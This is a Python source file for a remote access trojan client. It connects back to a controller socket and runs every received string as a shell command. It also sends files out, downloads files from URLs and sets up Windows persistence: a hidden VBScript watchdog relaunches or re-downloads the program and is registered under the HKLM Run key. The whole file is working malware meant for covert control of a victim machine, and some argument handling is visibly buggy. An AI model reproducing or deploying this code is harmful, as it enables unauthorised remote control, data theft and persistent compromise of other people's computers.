#!/usr/bin/env python3

import os
import sys
import time
import socket
import subprocess as sp
from socket import AF_INET, SOCK_STREAM
from urllib.request import urlopen
from common import pr, Send, Receive

HOST = '127.0.0.1'
PORT = 2000

active = False
sock = None
ret = ''

# ⬆️ ul file
def Upload(sock, file):
  try:
    f = open(file, 'rb')
  except IOError:
    return 'Error opening file ⚠️'
  d = f.read()
  f.close()
  Send(sock, d + b'FILENAMEXXX%sFILEXXX' % file.encode())
  time.sleep(1)
  return 'File sent 🍺'
 
# TODO: ssl
def Downhttp(sock, url):
  fn = url.split('/')[-1]
  fn = fn.split('?')[0]
  fn = fn.split('#')[0]

  f = open(fn, 'wb')
  f.write(urlopen(url).read())
  f.close()

  return "Download finished 🍺"

def Persist(sock, redown=None, newdir=None):
  if os.name == 'nt':
      # fetch executable's location
      exedir = os.path.join(sys.path[0], sys.argv[0])
      exeown = exedir.split('\\')[-1]

      # get vbscript location
      vbsdir = os.getcwd() + '\\' + 'vbscript.vbs'

      # write VBS script
      if redown == None: vbscript = 'state = 1\nhidden = 0\nwshname = "' + exedir + '"\nvbsname = "' + vbsdir + '"\nWhile state = 1\nexist = ReportFileStatus(wshname)\nIf exist = True then\nset objFSO = CreateObject("Scripting.FileSystemObject")\nset objFile = objFSO.GetFile(wshname)\nif objFile.Attributes AND 2 then\nelse\nobjFile.Attributes = objFile.Attributes + 2\nend if\nset objFSO = CreateObject("Scripting.FileSystemObject")\nset objFile = objFSO.GetFile(vbsname)\nif objFile.Attributes AND 2 then\nelse\nobjFile.Attributes = objFile.Attributes + 2\nend if\nSet WshShell = WScript.CreateObject ("WScript.Shell")\nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")\nFor Each objProcess in colProcessList\nif objProcess.name = "' + exeown + '" then\nvFound = True\nEnd if\nNext\nIf vFound = True then\nwscript.sleep 50000\nElse\nWshShell.Run """' + exedir + '""",hidden\nwscript.sleep 50000\nEnd If\nvFound = False\nElse\nwscript.sleep 50000\nEnd If\nWend\nFunction ReportFileStatus(filespec)\nDim fso, msg\nSet fso = CreateObject("Scripting.FileSystemObject")\nIf (fso.FileExists(filespec)) Then\nmsg = True\nElse\nmsg = False\nEnd If\nReportFileStatus = msg\nEnd Function\n'
      else:
        if newdir == None:
          newdir = exedir
          newexe = exeown
        else:
          newexe = newdir.split('\\')[-1]
        vbscript = 'state = 1\nhidden = 0\nwshname = "' + exedir + '"\nvbsname = "' + vbsdir + '"\nurlname = "' + redown + '"\ndirname = "' + newdir + '"\nWhile state = 1\nexist1 = ReportFileStatus(wshname)\nexist2 = ReportFileStatus(dirname)\nIf exist1 = False And exist2 = False then\ndownload urlname, dirname\nEnd If\nIf exist1 = True Or exist2 = True then\nif exist1 = True then\nset objFSO = CreateObject("Scripting.FileSystemObject")\nset objFile = objFSO.GetFile(wshname)\nif objFile.Attributes AND 2 then\nelse\nobjFile.Attributes = objFile.Attributes + 2\nend if\nexist2 = False\nend if\nif exist2 = True then\nset objFSO = CreateObject("Scripting.FileSystemObject")\nset objFile = objFSO.GetFile(dirname)\nif objFile.Attributes AND 2 then\nelse\nobjFile.Attributes = objFile.Attributes + 2\nend if\nend if\nset objFSO = CreateObject("Scripting.FileSystemObject")\nset objFile = objFSO.GetFile(vbsname)\nif objFile.Attributes AND 2 then\nelse\nobjFile.Attributes = objFile.Attributes + 2\nend if\nSet WshShell = WScript.CreateObject ("WScript.Shell")\nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")\nFor Each objProcess in colProcessList\nif objProcess.name = "' + exeown + '" OR objProcess.name = "' + newexe + '" then\nvFound = True\nEnd if\nNext\nIf vFound = True then\nwscript.sleep 50000\nEnd If\nIf vFound = False then\nIf exist1 = True then\nWshShell.Run """' + exedir + '""",hidden\nEnd If\nIf exist2 = True then\nWshShell.Run """' + dirname + '""",hidden\nEnd If\nwscript.sleep 50000\nEnd If\nvFound = False\nEnd If\nWend\nFunction ReportFileStatus(filespec)\nDim fso, msg\nSet fso = CreateObject("Scripting.FileSystemObject")\nIf (fso.FileExists(filespec)) Then\nmsg = True\nElse\nmsg = False\nEnd If\nReportFileStatus = msg\nEnd Function\nfunction download(sFileURL, sLocation)\nSet objXMLHTTP = CreateObject("MSXML2.XMLHTTP")\nobjXMLHTTP.open "GET", sFileURL, false\nobjXMLHTTP.send()\ndo until objXMLHTTP.Status = 200 :  wscript.sleep(1000) :  loop\nIf objXMLHTTP.Status = 200 Then\nSet objADOStream = CreateObject("ADODB.Stream")\nobjADOStream.Open\nobjADOStream.Type = 1\nobjADOStream.Write objXMLHTTP.ResponseBody\nobjADOStream.Position = 0\nSet objFSO = Createobject("Scripting.FileSystemObject")\nIf objFSO.Fileexists(sLocation) Then objFSO.DeleteFile sLocation\nSet objFSO = Nothing\nobjADOStream.SaveToFile sLocation\nobjADOStream.Close\nSet objADOStream = Nothing\nEnd if\nSet objXMLHTTP = Nothing\nEnd function\n'

      vbs = open('vbscript.vbs', 'wb')
      vbs.write(vbscript)
      vbs.close()

      # add registry to startup
      persist = run('reg ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v blah /t REG_SZ /d "' + vbsdir + '"')
      persist += '\nPersistence complete.\n'
      return persist

def run(s):
  c = sp.Popen(s, shell=True, stdout=sp.PIPE, stderr=sp.PIPE)
  out, err = c.communicate()
  out = out.decode('utf-8')
  err = err.decode('utf-8')
  return out + '\n' + err

while True:
  try:
    sock = socket.socket(AF_INET, SOCK_STREAM)
    sock.connect((HOST, PORT))
    if Receive(sock).decode() == 'activate':
      active = True
      Send(sock, os.getcwd() + '>')

    while active:
      data = Receive(sock)

      # ⬇️ dl file
      if data.endswith(b'FILEXXX'):
        data = data[:-7].split(b'FILENAMEXXX')
        d = b''.join(data[:-1])
        fn = data[-1].decode() # to str
        try:
          f = open(fn, 'wb')
          f.write(d)
          f.close()
        except IOError:
          ret = 'Error opening file ⚠️'     
        ret = 'File received 🍺'
        Send(sock, '%s\n%s>' % (ret, os.getcwd()))
        continue
      else:
        data = data.decode()

      if data == 'deactivate':
        active = False
        sock.close()
        break

      elif data.startswith('dl '):
        ret = Upload(sock, data[3:])

      elif data.startswith('dlhttp '):
        ret = Downhttp(sock, data[9:])

      elif data.startswith('persist '):
        # Attempt persistence
        if len(data.split(' ')) == 1: 
          ret = Persist(s)
        elif len(data.split(' ')) == 2:
          ret = Persist(s, data.split(' ')[1])
        elif len(data.split(' ')) == 3:
          ret = Persist(s, data.split(' ')[1], data.split(' ')[2])

      else:
        ret = run(data)

      ret += '\n%s>' % os.getcwd()
      Send(sock, ret)

  except socket.error:
    sock.close()
    time.sleep(10)
    continue
